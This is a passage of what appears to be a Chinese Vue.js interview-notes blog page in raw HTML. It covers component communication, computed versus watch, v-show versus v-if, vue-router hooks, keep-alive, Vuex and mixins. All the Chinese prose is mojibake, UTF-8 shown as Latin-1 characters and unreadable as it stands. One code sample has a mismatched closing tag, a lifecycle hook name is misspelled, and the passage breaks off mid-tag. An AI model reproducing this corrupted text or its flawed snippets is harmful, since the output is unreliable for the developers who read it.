æ¥å®ç°æ•°æ®å“åº”å¼ï¼Œé€šè¿‡è¿™ä¸ªå‡½æ•°å¯ä»¥ç›‘å¬åˆ° <code>set</code> å’Œ <code>get</code> çš„äº‹ä»¶ã€‚ï¼ˆå¥½éš¾ï¼‰</p><h2 id="Vue-ç»„ä»¶é—´çš„å‚æ•°ä¼ é€’æ–¹å¼ï¼Ÿ"><a href="#Vue-ç»„ä»¶é—´çš„å‚æ•°ä¼ é€’æ–¹å¼ï¼Ÿ" class="headerlink" title="Vue ç»„ä»¶é—´çš„å‚æ•°ä¼ é€’æ–¹å¼ï¼Ÿ"></a>Vue ç»„ä»¶é—´çš„å‚æ•°ä¼ é€’æ–¹å¼ï¼Ÿ</h2><h3 id="çˆ¶å­é€šä¿¡"><a href="#çˆ¶å­é€šä¿¡" class="headerlink" title="çˆ¶å­é€šä¿¡"></a>çˆ¶å­é€šä¿¡</h3><ul><li><p>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯å­ç»„ä»¶é€šè¿‡ props å±æ€§æ¥æ¥å—çˆ¶ç»„ä»¶çš„æ•°æ®ï¼Œç„¶åçˆ¶ç»„ä»¶åœ¨å­ç»„ä»¶ä¸Šæ³¨å†Œç›‘å¬äº‹ä»¶ï¼Œå­ç»„ä»¶é€šè¿‡ emit è§¦å‘äº‹ä»¶æ¥å‘çˆ¶ç»„ä»¶å‘é€æ•°æ®ã€‚å…¸å‹çš„å•å‘æ•°æ®æµï¼Œå­ç»„ä»¶ä¸èƒ½ç›´æ¥ä¿®æ”¹ propsï¼Œ è€Œæ˜¯å¿…é¡»é€šè¿‡å‘é€äº‹ä»¶çš„æ–¹å¼å‘ŠçŸ¥çˆ¶ç»„ä»¶ä¿®æ”¹æ•°æ®ã€‚</p><p>è¿™è¿˜å¯ä»¥ä½¿ç”¨è¯­æ³•ç³– <code>v-model</code> æ¥ç›´æ¥å®ç°ï¼Œå› ä¸º <code>v-model</code> é»˜è®¤ä¼šè§£ææˆåä¸º <code>value</code> çš„ <code>prop</code> å’Œåä¸º <code>input</code> çš„äº‹ä»¶ã€‚è¿™ç§è¯­æ³•ç³–çš„æ–¹å¼æ˜¯å…¸å‹çš„åŒå‘ç»‘å®šï¼Œå¸¸ç”¨äº UI æ§ä»¶ä¸Š</p></li><li><p>ç¬¬äºŒç§æ˜¯é€šè¿‡ ref å±æ€§ç»™å­ç»„ä»¶è®¾ç½®ä¸€ä¸ªåå­—ã€‚çˆ¶ç»„ä»¶é€šè¿‡ $refs ç»„ä»¶åæ¥è·å¾—å­ç»„ä»¶ï¼Œå­ç»„ä»¶é€šè¿‡ $parent è·å¾—çˆ¶ç»„ä»¶ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å®ç°é€šä¿¡ã€‚</p></li><li><p>ç¬¬ä¸‰ç§æ˜¯ä½¿ç”¨ provider/injectï¼Œåœ¨çˆ¶ç»„ä»¶ä¸­é€šè¿‡ provider æä¾›å˜é‡ï¼Œåœ¨å­ç»„ä»¶ä¸­é€šè¿‡ inject æ¥å°†å˜é‡æ³¨å…¥åˆ°ç»„ä»¶ä¸­ã€‚ä¸è®ºå­ç»„ä»¶æœ‰å¤šæ·±ï¼Œåªè¦è°ƒç”¨äº† inject é‚£ä¹ˆå°±å¯ä»¥æ³¨å…¥ provider ä¸­çš„æ•°æ®ã€‚</p></li><li><p>ç¬¬å››ç§ï¼ˆVue 2.3 åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰<code>$listeners</code> å±æ€§ä¼šå°†çˆ¶ç»„ä»¶ä¸­çš„ (ä¸å« <code>.native</code> ä¿®é¥°å™¨çš„) <code>v-on</code> äº‹ä»¶ç›‘å¬å™¨ä¼ é€’ç»™å­ç»„ä»¶ï¼Œå­ç»„ä»¶å¯ä»¥é€šè¿‡è®¿é—® <code>$listeners</code> æ¥è‡ªå®šä¹‰ç›‘å¬å™¨ã€‚<code>.sync</code> å±æ€§æ˜¯ä¸ªè¯­æ³•ç³–ï¼Œå¯ä»¥å¾ˆç®€å•çš„å®ç°å­ç»„ä»¶ä¸çˆ¶ç»„ä»¶é€šä¿¡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--çˆ¶ç»„ä»¶ä¸­--&gt;</span><br><span class="line">&lt;input :value.sync=&quot;value&quot; /&gt;</span><br><span class="line">&lt;!--ä»¥ä¸Šå†™æ³•ç­‰åŒäº--&gt;</span><br><span class="line">&lt;input :value=&quot;value&quot; @update:value=&quot;v =&gt; value = v&quot;&gt;&lt;/comp&gt;</span><br><span class="line">&lt;!--å­ç»„ä»¶ä¸­--&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  this.$emit(&#x27;update:value&#x27;, 1)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="å…„å¼Ÿç»„ä»¶é€šä¿¡"><a href="#å…„å¼Ÿç»„ä»¶é€šä¿¡" class="headerlink" title="å…„å¼Ÿç»„ä»¶é€šä¿¡"></a>å…„å¼Ÿç»„ä»¶é€šä¿¡</h3><ul><li><p>ç¬¬ä¸€ç§æ˜¯ä½¿ç”¨ eventBus çš„æ–¹æ³•ï¼Œå®ƒçš„æœ¬è´¨æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªç©ºçš„ Vue å®ä¾‹æ¥ä½œä¸ºæ¶ˆæ¯ä¼ é€’çš„å¯¹è±¡ï¼Œé€šä¿¡çš„ç»„ä»¶å¼•å…¥è¿™ä¸ªå®ä¾‹ï¼Œé€šä¿¡çš„ç»„ä»¶é€šè¿‡åœ¨è¿™ä¸ªå®ä¾‹ä¸Šç›‘å¬å’Œè§¦å‘äº‹ä»¶ï¼Œæ¥å®ç°æ¶ˆæ¯çš„ä¼ é€’ã€‚</p></li><li><p>ç¬¬äºŒç§æ˜¯é€šè¿‡é€šè¿‡æŸ¥æ‰¾çˆ¶ç»„ä»¶ä¸­çš„å­ç»„ä»¶æ¥è·å–åˆ°å…„å¼Ÿç»„ä»¶<code>this.$parent.$children</code>ï¼Œåœ¨ <code>$children</code> ä¸­å¯ä»¥é€šè¿‡ç»„ä»¶ <code>name</code> æŸ¥è¯¢åˆ°éœ€è¦çš„ç»„ä»¶å®ä¾‹ï¼Œç„¶åè¿›è¡Œé€šä¿¡ã€‚</p></li></ul><h3 id="è·¨å¤šå±‚æ¬¡ç»„ä»¶é€šä¿¡"><a href="#è·¨å¤šå±‚æ¬¡ç»„ä»¶é€šä¿¡" class="headerlink" title="è·¨å¤šå±‚æ¬¡ç»„ä»¶é€šä¿¡"></a>è·¨å¤šå±‚æ¬¡ç»„ä»¶é€šä¿¡</h3><p>Vue 2.2 æ–°å¢çš„ API <code>provide / inject</code>ï¼šå‡è®¾æœ‰çˆ¶ç»„ä»¶ Aï¼Œç„¶åæœ‰ä¸€ä¸ªè·¨å¤šå±‚çº§çš„å­ç»„ä»¶ B</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// çˆ¶ç»„ä»¶ A</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">provide</span>: &#123;</span><br><span class="line">    <span class="attr">data</span>: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å­ç»„ä»¶ B</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">inject</span>: [<span class="string">&#x27;data&#x27;</span>],</span><br><span class="line">  <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// æ— è®ºè·¨å‡ å±‚éƒ½èƒ½è·å¾—çˆ¶ç»„ä»¶çš„ data å±æ€§</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.data) <span class="comment">// =&gt; 1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»»æ„ç»„ä»¶"><a href="#ä»»æ„ç»„ä»¶" class="headerlink" title="ä»»æ„ç»„ä»¶"></a>ä»»æ„ç»„ä»¶</h3><ul><li><p>Event Bus ï¼Œå…¶å®å°±æ˜¯åˆ›å»ºä¸€ä¸ªäº‹ä»¶ä¸­å¿ƒï¼Œç›¸å½“äºä¸­è½¬ç«™ï¼Œå¯ä»¥ç”¨å®ƒæ¥ä¼ é€’äº‹ä»¶å’Œæ¥æ”¶äº‹ä»¶ã€‚</p></li><li><p>Vuexã€‚å¦‚æœä¸šåŠ¡é€»è¾‘å¤æ‚ï¼Œå¾ˆå¤šç»„ä»¶ä¹‹é—´éœ€è¦åŒæ—¶å¤„ç†ä¸€äº›å…¬å…±çš„æ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™é‡‡ç”¨ä¸Šé¢è¿™ä¸€äº›æ–¹æ³•å¯èƒ½ä¸åˆ©äºé¡¹ç›®çš„ç»´æŠ¤ã€‚Vuex çš„æ€æƒ³å°±æ˜¯å°†è¿™ä¸€äº›å…¬å…±çš„æ•°æ®æŠ½ç¦»å‡ºæ¥ï¼Œå°†å®ƒä½œä¸ºä¸€ä¸ªå…¨å±€çš„å˜é‡æ¥ç®¡ç†ï¼Œç„¶åå…¶ä»–ç»„ä»¶å°±å¯ä»¥å¯¹è¿™ä¸ªå…¬å…±æ•°æ®è¿›è¡Œè¯»å†™æ“ä½œï¼Œè¿™æ ·è¾¾åˆ°äº†è§£è€¦çš„ç›®çš„ã€‚</p></li></ul><h2 id="computed-å’Œ-watch-çš„å·®å¼‚ï¼Ÿ"><a href="#computed-å’Œ-watch-çš„å·®å¼‚ï¼Ÿ" class="headerlink" title="computed å’Œ watch çš„å·®å¼‚ï¼Ÿ"></a>computed å’Œ watch çš„å·®å¼‚ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰computed æ˜¯<strong>è®¡ç®—ä¸€ä¸ªæ–°çš„å±æ€§ï¼Œå¹¶å°†è¯¥å±æ€§æŒ‚è½½åˆ° Vue å®ä¾‹</strong>ä¸Šï¼Œè€Œ watch æ˜¯<strong>ç›‘å¬å·²ç»å­˜åœ¨ä¸”å·²æŒ‚è½½åˆ° Vue å®ä¾‹ä¸Šçš„æ•°æ®</strong>ï¼Œæ‰€ä»¥ç”¨ watch åŒæ ·å¯ä»¥ç›‘å¬ computed è®¡ç®—å±æ€§çš„å˜åŒ–ã€‚</p><p>ï¼ˆ2ï¼‰computed æœ¬è´¨æ˜¯ä¸€ä¸ªæƒ°æ€§æ±‚å€¼çš„è§‚å¯Ÿè€…ï¼Œå…·æœ‰<strong>ç¼“å­˜æ€§</strong>ï¼Œåªæœ‰å½“ä¾èµ–å˜åŒ–åï¼Œç¬¬ä¸€æ¬¡è®¿é—® computed å±æ€§ï¼Œæ‰ä¼šè®¡ç®—æ–°çš„å€¼ã€‚è€Œ watch åˆ™æ˜¯<strong>å½“æ•°æ®å‘ç”Ÿå˜åŒ–ä¾¿ä¼šè°ƒç”¨æ‰§è¡Œå‡½æ•°</strong>ã€‚</p><p>ï¼ˆ3ï¼‰ä½¿ç”¨åœºæ™¯ï¼šéœ€è¦ä¾èµ–åˆ«çš„å±æ€§æ¥åŠ¨æ€è·å¾—å€¼çš„æ—¶å€™å¯ä»¥ä½¿ç”¨ computedï¼Œå¯¹äºç›‘å¬åˆ°å€¼çš„å˜åŒ–éœ€è¦åšä¸€äº›å¤æ‚ä¸šåŠ¡é€»è¾‘çš„æƒ…å†µå¯ä»¥ä½¿ç”¨ watchã€‚</p><h2 id="v-show-ä¸-v-if-åŒºåˆ«"><a href="#v-show-ä¸-v-if-åŒºåˆ«" class="headerlink" title="v-show ä¸ v-if åŒºåˆ«"></a>v-show ä¸ v-if åŒºåˆ«</h2><p><code>v-show</code> åªæ˜¯åœ¨ <code>display: none</code> å’Œ <code>display: block</code> ä¹‹é—´åˆ‡æ¢ã€‚æ— è®ºåˆå§‹æ¡ä»¶æ˜¯ä»€ä¹ˆéƒ½ä¼šè¢«æ¸²æŸ“å‡ºæ¥ï¼Œåé¢åªéœ€è¦åˆ‡æ¢ CSSï¼ŒDOM è¿˜æ˜¯ä¸€ç›´ä¿ç•™ç€çš„ã€‚æ‰€ä»¥æ€»çš„æ¥è¯´ <code>v-show</code> <strong>åœ¨åˆå§‹æ¸²æŸ“æ—¶æœ‰æ›´é«˜çš„å¼€é”€ï¼Œä½†æ˜¯åˆ‡æ¢å¼€é”€å¾ˆå°ï¼Œæ›´é€‚åˆäºé¢‘ç¹åˆ‡æ¢çš„åœºæ™¯ã€‚</strong></p><p><code>v-if</code> çš„è¯å°±å¾—è¯´åˆ° Vue åº•å±‚çš„ç¼–è¯‘äº†ã€‚å½“å±æ€§åˆå§‹ä¸º <code>false</code> æ—¶ï¼Œç»„ä»¶å°±ä¸ä¼šè¢«æ¸²æŸ“ï¼Œç›´åˆ°æ¡ä»¶ä¸º <code>true</code>ï¼Œå¹¶ä¸”åˆ‡æ¢æ¡ä»¶æ—¶ä¼šè§¦å‘é”€æ¯/æŒ‚è½½ç»„ä»¶ï¼Œæ‰€ä»¥æ€»çš„æ¥è¯´<strong>åœ¨åˆ‡æ¢æ—¶å¼€é”€æ›´é«˜ï¼Œæ›´é€‚åˆä¸ç»å¸¸åˆ‡æ¢çš„åœºæ™¯ã€‚</strong></p><p>å¹¶ä¸”åŸºäº <code>v-if</code> çš„è¿™ç§æƒ°æ€§æ¸²æŸ“æœºåˆ¶ï¼Œå¯ä»¥åœ¨å¿…è¦çš„æ—¶å€™æ‰å»æ¸²æŸ“ç»„ä»¶ï¼Œå‡å°‘æ•´ä¸ªé¡µé¢çš„åˆå§‹æ¸²æŸ“å¼€é”€ã€‚</p><h2 id="vue-router"><a href="#vue-router" class="headerlink" title="vue-router"></a>vue-router</h2><p><strong>è§£å†³çš„é—®é¢˜ï¼š</strong></p><ul><li>ç›‘å¬ URL çš„å˜åŒ–ï¼Œå¹¶åœ¨å˜åŒ–å‰åæ‰§è¡Œç›¸åº”çš„é€»è¾‘</li><li>ä¸åŒçš„ URL å¯¹åº”ä¸åŒçš„ä¸åŒçš„ç»„ä»¶</li><li>æä¾›å¤šç§æ–¹å¼æ”¹å˜ URL çš„ API  ( URL çš„æ”¹å˜ä¸èƒ½å¯¼è‡´æµè§ˆå™¨åˆ·æ–°)</li></ul><p><strong>ä½¿ç”¨æ–¹å¼ï¼š</strong></p><ul><li>æä¾›ä¸€ä¸ªè·¯ç”±é…ç½®è¡¨ï¼Œä¸åŒ URL å¯¹åº”ä¸åŒç»„ä»¶çš„é…ç½®</li><li>åˆå§‹åŒ–è·¯ç”±å®ä¾‹ new VueRouter()</li><li>æŒ‚è½½åˆ° Vue å®ä¾‹ä¸Š</li><li>æä¾›ä¸€ä¸ªè·¯ç”±å ä½ï¼Œç”¨æ¥æŒ‚è½½ URL åŒ¹é…åˆ°çš„ç»„ä»¶ </li></ul><h2 id="vue-router-ä¸­çš„å¯¼èˆªé’©å­å‡½æ•°"><a href="#vue-router-ä¸­çš„å¯¼èˆªé’©å­å‡½æ•°" class="headerlink" title="vue-router ä¸­çš„å¯¼èˆªé’©å­å‡½æ•°"></a>vue-router ä¸­çš„å¯¼èˆªé’©å­å‡½æ•°</h2><p>ï¼ˆ1ï¼‰å…¨å±€çš„é’©å­å‡½æ•° beforeEach å’Œ afterEach</p><p>beforeEach æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œto ä»£è¡¨è¦è¿›å…¥çš„è·¯ç”±å¯¹è±¡ï¼Œfrom ä»£è¡¨ç¦»å¼€çš„è·¯ç”±å¯¹è±¡ã€‚next æ˜¯ä¸€ä¸ªå¿…é¡»è¦æ‰§è¡Œçš„å‡½æ•°ï¼Œå¦‚æœä¸ä¼ å‚æ•°ï¼Œé‚£å°±æ‰§è¡Œä¸‹ä¸€ä¸ªé’©å­å‡½æ•°ï¼Œå¦‚æœä¼ å…¥ falseï¼Œåˆ™ç»ˆæ­¢è·³è½¬ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ªè·¯å¾„ï¼Œåˆ™å¯¼èˆªåˆ°å¯¹åº”çš„è·¯ç”±ï¼Œå¦‚æœä¼ å…¥ error ï¼Œåˆ™å¯¼èˆªç»ˆæ­¢ï¼Œerror ä¼ å…¥é”™è¯¯çš„ç›‘å¬å‡½æ•°ã€‚</p><p>ï¼ˆ2ï¼‰å•ä¸ªè·¯ç”±ç‹¬äº«çš„é’©å­å‡½æ•° beforeEnterï¼Œå®ƒæ˜¯åœ¨è·¯ç”±é…ç½®ä¸Šç›´æ¥è¿›è¡Œå®šä¹‰çš„ã€‚</p><p>ï¼ˆ3ï¼‰ç»„ä»¶å†…çš„å¯¼èˆªé’©å­ä¸»è¦æœ‰è¿™ä¸‰ç§ï¼šbeforeRouteEnterã€beforeRouteUpdateã€beforeRouteLeaveã€‚å®ƒä»¬æ˜¯ç›´æ¥åœ¨è·¯ç”±ç»„<br>ä»¶å†…éƒ¨ç›´æ¥è¿›è¡Œå®šä¹‰çš„ã€‚</p><h2 id="route-å’Œ-router-çš„åŒºåˆ«ï¼Ÿ"><a href="#route-å’Œ-router-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="$route å’Œ $router çš„åŒºåˆ«ï¼Ÿ"></a>$route å’Œ $router çš„åŒºåˆ«ï¼Ÿ</h2><p>$route æ˜¯â€œè·¯ç”±ä¿¡æ¯å¯¹è±¡â€ï¼ŒåŒ…æ‹¬ pathï¼Œparamsï¼Œhashï¼Œqueryï¼ŒfullPathï¼Œmatchedï¼Œname ç­‰è·¯ç”±ä¿¡æ¯å‚æ•°ã€‚è€Œ $router æ˜¯â€œè·¯ç”±å®ä¾‹â€å¯¹è±¡åŒ…æ‹¬äº†è·¯ç”±çš„è·³è½¬æ–¹æ³•ï¼Œé’©å­å‡½æ•°ç­‰ã€‚</p><h2 id="vue-å¸¸ç”¨çš„ä¿®é¥°ç¬¦ï¼Ÿ"><a href="#vue-å¸¸ç”¨çš„ä¿®é¥°ç¬¦ï¼Ÿ" class="headerlink" title="vue å¸¸ç”¨çš„ä¿®é¥°ç¬¦ï¼Ÿ"></a>vue å¸¸ç”¨çš„ä¿®é¥°ç¬¦ï¼Ÿ</h2><p>.prevent: æäº¤äº‹ä»¶ä¸å†é‡è½½é¡µé¢ï¼›.stop: é˜»æ­¢å•å‡»äº‹ä»¶å†’æ³¡ï¼›.self: å½“äº‹ä»¶å‘ç”Ÿåœ¨è¯¥å…ƒç´ æœ¬èº«è€Œä¸æ˜¯å­å…ƒç´ çš„æ—¶å€™ä¼šè§¦å‘ï¼›</p><h2 id="vue-ä¸­-key-å€¼çš„ä½œç”¨ï¼Ÿ"><a href="#vue-ä¸­-key-å€¼çš„ä½œç”¨ï¼Ÿ" class="headerlink" title="vue ä¸­ key å€¼çš„ä½œç”¨ï¼Ÿ"></a>vue ä¸­ key å€¼çš„ä½œç”¨ï¼Ÿ</h2><p>vue ä¸­ key å€¼çš„ä½œç”¨å¯ä»¥åˆ†ä¸ºä¸¤ç§æƒ…å†µæ¥è€ƒè™‘ã€‚</p><p>ç¬¬ä¸€ç§æƒ…å†µæ˜¯ v-if ä¸­ä½¿ç”¨ keyã€‚ç”±äº Vue ä¼šå°½å¯èƒ½é«˜æ•ˆåœ°æ¸²æŸ“å…ƒç´ ï¼Œé€šå¸¸ä¼šå¤ç”¨å·²æœ‰å…ƒç´ è€Œä¸æ˜¯ä»å¤´å¼€å§‹æ¸²æŸ“ã€‚å› æ­¤å½“æˆ‘ä»¬ä½¿ç”¨ v-if æ¥å®ç°å…ƒç´ åˆ‡æ¢çš„æ—¶å€™ï¼Œå¦‚æœåˆ‡æ¢å‰åå«æœ‰ç›¸åŒç±»å‹çš„å…ƒç´ ï¼Œé‚£ä¹ˆè¿™ä¸ªå…ƒç´ å°±ä¼šè¢«å¤ç”¨ã€‚å¦‚æœæ˜¯ç›¸åŒçš„ input å…ƒç´ ï¼Œé‚£ä¹ˆåˆ‡æ¢å‰åç”¨æˆ·çš„è¾“å…¥ä¸ä¼šè¢«æ¸…é™¤æ‰ï¼Œè¿™æ ·æ˜¯ä¸ç¬¦åˆéœ€æ±‚çš„ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ key æ¥å”¯ä¸€çš„æ ‡è¯†ä¸€ä¸ªå…ƒç´ ï¼Œè¿™ä¸ªæƒ…å†µä¸‹ï¼Œä½¿ç”¨ key çš„å…ƒç´ ä¸ä¼šè¢«å¤ç”¨ã€‚è¿™ä¸ªæ—¶å€™ key çš„ä½œç”¨æ˜¯ç”¨æ¥æ ‡è¯†ä¸€ä¸ªç‹¬ç«‹çš„å…ƒç´ ã€‚</p><p>ç¬¬äºŒç§æƒ…å†µæ˜¯ v-for ä¸­ä½¿ç”¨ keyã€‚ç”¨ v-for æ›´æ–°å·²æ¸²æŸ“è¿‡çš„å…ƒç´ åˆ—è¡¨æ—¶ï¼Œå®ƒé»˜è®¤ä½¿ç”¨â€œå°±åœ°å¤ç”¨â€çš„ç­–ç•¥ã€‚å¦‚æœæ•°æ®é¡¹çš„é¡ºåºå‘ç”Ÿäº†æ”¹å˜ï¼ŒVue ä¸ä¼šç§»åŠ¨ DOM å…ƒç´ æ¥åŒ¹é…æ•°æ®é¡¹çš„é¡ºåºï¼Œè€Œæ˜¯ç®€å•å¤ç”¨æ­¤å¤„çš„æ¯ä¸ªå…ƒç´ ã€‚å› æ­¤é€šè¿‡ä¸ºæ¯ä¸ªåˆ—è¡¨é¡¹æä¾›ä¸€ä¸ª key å€¼ï¼Œæ¥ä»¥ä¾¿ Vue è·Ÿè¸ªå…ƒç´ çš„èº«ä»½ï¼Œä»è€Œé«˜æ•ˆçš„å®ç°å¤ç”¨ã€‚è¿™ä¸ªæ—¶å€™ key çš„ä½œç”¨æ˜¯ä¸ºäº†é«˜æ•ˆçš„æ›´æ–°æ¸²æŸ“è™šæ‹Ÿ DOMã€‚</p><h2 id="computed-å’Œ-watch-åŒºåˆ«ï¼Ÿ"><a href="#computed-å’Œ-watch-åŒºåˆ«ï¼Ÿ" class="headerlink" title="computed å’Œ watch åŒºåˆ«ï¼Ÿ"></a>computed å’Œ watch åŒºåˆ«ï¼Ÿ</h2><p>computed æ˜¯è®¡ç®—å±æ€§ï¼Œä¾èµ–å…¶ä»–å±æ€§è®¡ç®—å€¼ï¼Œå¹¶ä¸” computed çš„å€¼æœ‰ç¼“å­˜ï¼Œåªæœ‰å½“è®¡ç®—å€¼å˜åŒ–æ‰ä¼šè¿”å›å†…å®¹ã€‚</p><ul><li>å‡å°‘æ¨¡æ¿ä¸­è®¡ç®—é€»è¾‘</li><li>æ•°æ®ç¼“å­˜</li><li>ä¾èµ–å›ºå®šçš„æ•°æ®ç±»å‹ï¼ˆå“åº”å¼æ•°æ®ï¼‰</li></ul><p>watch ç›‘å¬åˆ°å€¼çš„å˜åŒ–å°±ä¼šæ‰§è¡Œå›è°ƒï¼Œåœ¨å›è°ƒä¸­å¯ä»¥è¿›è¡Œä¸€äº›é€»è¾‘æ“ä½œã€‚</p><ul><li>æ›´åŠ çµæ´»ã€é€šç”¨</li><li>watch ä¸­å¯ä»¥æ‰§è¡Œä»»ä½•é€»è¾‘ï¼Œå¦‚å‡½æ•°èŠ‚æµï¼ŒAjax å¼‚æ­¥è·å–æ•°æ®ï¼Œç”šè‡³æ“ä½œ DOMã€‚</li></ul><p>åŒºåˆ«ï¼š</p><ul><li>computed èƒ½åšçš„ï¼Œwatch éƒ½èƒ½åšï¼Œåä¹‹åˆ™ä¸è¡Œã€‚</li><li>èƒ½ç”¨ computed çš„å°½é‡ç”¨ computedã€‚</li></ul><h2 id="keep-alive-ç»„ä»¶æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"><a href="#keep-alive-ç»„ä»¶æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ" class="headerlink" title="keep-alive ç»„ä»¶æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"></a>keep-alive ç»„ä»¶æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</h2><p>å¦‚æœéœ€è¦åœ¨ç»„ä»¶åˆ‡æ¢çš„æ—¶å€™ï¼Œä¿å­˜ä¸€äº›ç»„ä»¶çš„çŠ¶æ€é˜²æ­¢å¤šæ¬¡æ¸²æŸ“ï¼Œå°±å¯ä»¥ä½¿ç”¨ keep-alive ç»„ä»¶åŒ…è£¹éœ€è¦ä¿å­˜çš„ç»„ä»¶ã€‚</p><p>å¯¹äº <code>keep-alive</code> ç»„ä»¶æ¥è¯´ï¼Œå®ƒæ‹¥æœ‰ä¸¤ä¸ªç‹¬æœ‰çš„ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼Œåˆ†åˆ«ä¸º <code>activated</code> å’Œ <code>deactivated</code> ã€‚ç”¨ <code>keep-alive</code> åŒ…è£¹çš„ç»„ä»¶åœ¨åˆ‡æ¢æ—¶ä¸ä¼šè¿›è¡Œé”€æ¯ï¼Œè€Œæ˜¯ç¼“å­˜åˆ°å†…å­˜ä¸­å¹¶æ‰§è¡Œ <code>deactivated</code> é’©å­å‡½æ•°ï¼Œå‘½ä¸­ç¼“å­˜æ¸²æŸ“åä¼šæ‰§è¡Œ <code>actived</code> é’©å­å‡½æ•°ã€‚</p><h2 id="Vuex-æ ¸å¿ƒæ¦‚å¿µ-amp-åº•å±‚åŸç†"><a href="#Vuex-æ ¸å¿ƒæ¦‚å¿µ-amp-åº•å±‚åŸç†" class="headerlink" title="Vuex æ ¸å¿ƒæ¦‚å¿µ&amp;åº•å±‚åŸç†"></a>Vuex æ ¸å¿ƒæ¦‚å¿µ&amp;åº•å±‚åŸç†</h2><ul><li>State â€”â€” this.$store.state.xxx å–å€¼ã€‚       æä¾›ä¸€ä¸ªå“åº”å¼æ•°æ®</li><li>Getter â€”â€” this.$store.getters.xxx å–å€¼ã€‚      å€ŸåŠ© Vue çš„è®¡ç®—å±æ€§ computed æ¥å®ç°ç¼“å­˜</li><li>Mutation â€”â€” this.$store.commit( â€œxxxâ€ )èµ‹å€¼ã€‚      æ›´æ”¹ state æ–¹æ³•</li><li>Action â€”â€” this.$store.dispatch( â€œxxxâ€ )èµ‹å€¼ã€‚      è§¦å‘ mutation æ–¹æ³•</li><li>Moduleã€‚      Vue.set åŠ¨æ€æ·»åŠ  state åˆ°å“åº”å¼æ•°æ®ä¸­</li></ul><h2 id="vue-ä¸­-mixin-å’Œ-mixins-åŒºåˆ«ï¼Ÿ"><a href="#vue-ä¸­-mixin-å’Œ-mixins-åŒºåˆ«ï¼Ÿ" class="headerlink" title="vue ä¸­ mixin å’Œ mixins åŒºåˆ«ï¼Ÿ"></a>vue ä¸­ mixin å’Œ mixins åŒºåˆ«ï¼Ÿ</h2><p>mixin ç”¨äºå…¨å±€æ··å…¥ï¼Œä¼šå½±å“åˆ°æ¯ä¸ªç»„ä»¶å®ä¾‹ï¼Œé€šå¸¸æ’ä»¶éƒ½æ˜¯è¿™æ ·åšåˆå§‹åŒ–çš„ã€‚å¯ä»¥å…¨å±€æ··å…¥å°è£…å¥½çš„ ajax æˆ–è€…ä¸€äº›å·¥å…·å‡½æ•°ç­‰ç­‰ã€‚ </p><p>ä½¿ç”¨ mixin æ··å…¥æ—¶ï¼š</p><ul><li>mixin çš„é’©å­å‡½æ•°ä¼šå†è‡ªå·±ç»„ä»¶çš„é’©å­å‡½æ•°ä¹‹å‰è§¦å‘</li><li>å¯¹äº methodsã€computed è¿™äº›é…ç½®é¡¹ç­‰ï¼ŒVue ä¼šè¿›è¡Œåˆå¹¶</li><li>å¯¹äºåŒåå±æ€§ï¼ŒVue ä¼šç”¨ç»„ä»¶é‡Œçš„æ¥è¦†ç›– mixin çš„</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Vue.mixin(&#123;</span><br><span class="line">    <span class="function"><span class="title">beforeCreate</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// ...é€»è¾‘</span></span><br><span class="line">        <span class="comment">// è¿™ç§æ–¹å¼ä¼šå½±å“åˆ°æ¯ä¸ªç»„ä»¶çš„ beforeCreate é’©å­å‡½æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>mixins æ˜¯æˆ‘ä»¬æœ€å¸¸ä½¿ç”¨çš„æ‰©å±•ç»„ä»¶çš„æ–¹å¼ã€‚å¦‚æœå¤šä¸ªç»„ä»¶ä¸­æœ‰ç›¸åŒçš„ä¸šåŠ¡é€»è¾‘ï¼Œå°±å¯ä»¥å°†è¿™äº›é€»è¾‘å‰¥ç¦»å‡ºæ¥ï¼Œé€šè¿‡ mixins æ··å…¥ä»£ç ï¼Œæ¯”å¦‚ä¸Šæ‹‰ä¸‹æ‹‰åŠ è½½æ•°æ®è¿™ç§é€»è¾‘ç­‰ç­‰ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mixinObj = &#123;</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="function"><span class="title">mixinFunc</span>(<span class="params"></span>)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="attr">mixins</span>: [mixinObj],</span><br><span class="line">    <span class="function"><span class="title">created</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.mixinFunc();</span><br><span class="line">    &#125;</span><br><span 